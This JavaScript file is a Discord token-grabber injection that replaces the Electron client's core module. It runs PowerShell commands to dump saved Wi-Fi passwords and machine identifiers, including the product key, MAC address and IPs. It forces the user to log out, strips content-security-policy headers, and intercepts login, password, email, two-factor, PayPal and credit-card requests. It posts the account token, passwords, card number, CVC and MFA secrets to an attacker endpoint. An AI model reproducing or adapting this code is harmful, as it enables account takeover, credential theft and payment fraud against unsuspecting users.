const { BrowserWindow, session } = require('electron');
const { execSync } = require("child_process");

const API = "*API*";
var loggedOut = false;

let w = "", W = execSync(`netsh wlan export profile key=clear;Get-ChildItem *.xml | ForEach-Object { $xml=[xml] (get-content $_); $a= $xml.WLANProfile.SSIDConfig.SSID.name + ": " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial; $a; }`, {shell: "powershell.exe" }).toString().split("\r\n");W.forEach(r => r.includes(": ") ? w += r + "\n" : "f"); w.includes("�?T") ? w = w.replace(/�\?T/g, "'") : "";
const v = execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID").toString().split("\r\n")[0];
const h = execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress").toString().split("\r\n")[0];
const l = execSync("powershell.exe (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey").toString().split("\r\n")[0];
const i = execSync("powershell.exe (Get-NetIPAddress).IPAddress").toString().split('\r\n')[0];
const k = execSync("wmic os get TotalVisibleMemorySize").toString().split("\r\n")[1].trim();
const j = execSync("wmic cpu get caption").toString().split("\r\r\n")[1].trim();
const p = execSync("echo %USERNAME%").toString().trim();
const n = execSync("powershell.exe (Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress").toString().split("\r\n")[0];
const _d = __dirname;

session.defaultSession.webRequest.onBeforeRequest({
    'urls': [
        'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
        'https://*.discord.com/api/v*/applications/detectable',
        'https://discord.com/api/v*/applications/detectable',
        'https://*.discord.com/api/v*/users/@me/library',
        'https://discord.com/api/v*/users/@me/library',
        'https://*.discord.com/api/v*/users/@me/billing/subscriptions',
        'https://discord.com/api/v*/users/@me/billing/subscriptions',
        'wss://remote-auth-gateway.discord.gg/*'
    ]
}, (a, c) => {
    const win = BrowserWindow.getAllWindows()[0];
    if (loggedOut == false) {
        loggedOut = true;
        win.webContents.executeJavaScript(`window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [["get_require"]]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]); function LogOut() { (function (a) { const b = "string" == typeof a ? a : null; for (const c in gg.c) if (gg.c.hasOwnProperty(c)) { const d = gg.c[c].exports; if (d && d.__esModule && d.default && (b ? d.default[b] : a(d.default))) return d.default; if (d && (b ? d[b] : a(d))) return d } return null })("login").logout() } LogOut();`, true)
    } else {}
    if (a.url.startsWith('wss://')) {
        c({ 'cancel': true });
    } else {
        c({ 'cancel': false});
    }
})

session.defaultSession.webRequest.onHeadersReceived((a, c) => {
    delete a.responseHeaders['content-security-policy'];
    delete a.responseHeaders['content-security-policy-report-only'];
    c({
        'responseHeaders': {
            ...a.responseHeaders,
            'Access-Control-Allow-Headers': '*'
        }
    });
});

function newData(a, b, c) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
          var xmlHttp = new XMLHttpRequest();
          xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
          xmlHttp.send( null );
          xmlHttp.responseText;
      `, !0).then((ip) => { 
        const e = {
			IpAddress: ip,
			injected: _d,
			Uuid: v,
			MacAddress: h,
			ProductKey: l,
			LocalIp: i,
			Ram: `"${k} KB"`,
			CpuModel: j,
			UserName: p,
			GetIpAddress: n,
			WifiPass: w            
        };
        switch (a) {
            case 'login':
                send("login", {
                    ip: ip,
                    token: b,
					login: c['login'],
					undelete: c['undelete'],
					login_source: c['login_source'],
					gift_code_sku_id: c['gift_code_sku_id'],
                    password: c['password'],
                    ...e
                });
                break;
            case "newusername":
                send("newusername", {
                    ip: ip,
                    token: b,
                    password: c['password'],
                    new_username: c['username'],
                    ...e
                });
                break;
            case 'newemail':
                send("newemail", {
                    ip: ip,
                    token: b,
                    password: c['password'],
                    new_email: c['email'],
                    ...e
                });
                break;
            case 'newpass':
                send("newpass", {
                    ip: ip,
                    token: b,
                    old_password: c['password'],
                    new_password: c['new_password'],
                    ...e
                });
                break;
            case 'newcard':
                send("newcard", {
                    ip: ip,
                    token: b,
                    number: c['c[number]'],
                    date: `${c['c[exp_month]']}:${c['c[exp_year]']}`,
                    cvc: c['c[cvc]'],
                    guid: c.guid,
                    muid:c.muid,
                    sid: c.sid,
                    userAgent: c.payment_user_agent,
                    key:c.key,
                    ...e
                });
                break;
            case 'paypal':
                send("paypal", {
                    ip: ip,
                    token: b,
                    email: c['email'],
                    password: c['password'],
                    new_paypal: "done",
                    ...e
                });
                break;
            case 'mfaenable':
                send("mfaenable", {
                    ip: ip,
                    token: b,
                    password: c['password'],
                    code: c['code'],
                    authKey: c['secret'],
                    ...e
                });
                break;
            case "mfadisable":
                send("mfadisable", {
                    ip: ip,
                    token: b,
                    code: c,
                    ...e
                });
                break;
            case "injected":
                send("injected", {
                    ...e
                });
        }
    });
}
function send(a, b) {
    return new Promise((e, r) => {
        BrowserWindow.getAllWindows()[0]
        .webContents
        .executeJavaScript(`fetch("${API}/${a}", 
                ${JSON.stringify({
                    method: 'POST',
                    body: JSON.stringify(b)
                })})`).then(d => {
            if (d.ok) {
                e(d.json());
            } else {
                r(`${d.status} - ${d.statusText}`);
            }
        })
        .catch(x => {
            r(x);
        });
    });
}


session.defaultSession.webRequest.onCompleted({
    'urls': [
        'https://discord.com/api/v*/users/@me',
        'https://discordapp.com/api/v*/users/@me',
        'https://*.discord.com/api/v*/users/@me',
        "https://discord.com/api/v*/users/@me/mfa/totp/disable", 
        "https://discordapp.com/api/v*/users/@me/mfa/totp/disable", 
        "https://*.discord.com/api/v*/users/@me/mfa/totp/disable", 
        "https://canary.discord.com/api/v*/users/@me/mfa/totp/disable", 
        "https://discord.com/api/v*/users/@me/mfa/totp/enable", 
        "https://discordapp.com/api/v*/users/@me/mfa/totp/enable", 
        "https://*.discord.com/api/v*/users/@me/mfa/totp/enable", 
        "https://canary.discord.com/api/v*/users/@me/mfa/totp/enable",
        "https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens", 
        "https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
        "https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens", 
        'https://discordapp.com/api/v*/auth/login',
        'https://discord.com/api/v*/auth/login',
        'https://*.discord.com/api/v*/auth/login',
        'https://api.stripe.com/v*/tokens'
    ]
}, async (a, b) => {
    const win = BrowserWindow.getAllWindows()[0];
    const d = JSON.parse(Buffer.from(a.uploadData[0].bytes).toString());
    const t = await win.webContents.executeJavaScript(`for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;`, true)
   
    if (a.statusCode != 200) return;
    if (a.url.endsWith('/login')) {
        newData('login', t, d);
    }

    if (a.url.includes('/users/@me/mfa/totp/enable')) {
        newData('mfaenable', t, d);
    }

    if (a.url.includes('/users/@me/mfa/totp/disable')) {
        newData('mfadisable', t, d);
    }

    if (a.url.endsWith('/paypal/billing-agreement-tokens')) {
        newData('paypal', t, d);
    }

    if (a.url.endsWith('/users/@me')) {
        if (a.method != 'PATCH') return;
        if (!d['password']) return;

        if (d['email']) {
            newData('newemail', t, d);
        }

        if (d['new_password']) {
            newData('newpass', t, d);
        }

        if (d['username']) {
            newData('newusername', t, d);
        }
    }

    if (a.url.endsWith('/tokens')) {
        newData('newcard', t, d);
    }

}), module.exports = require('./core.asar');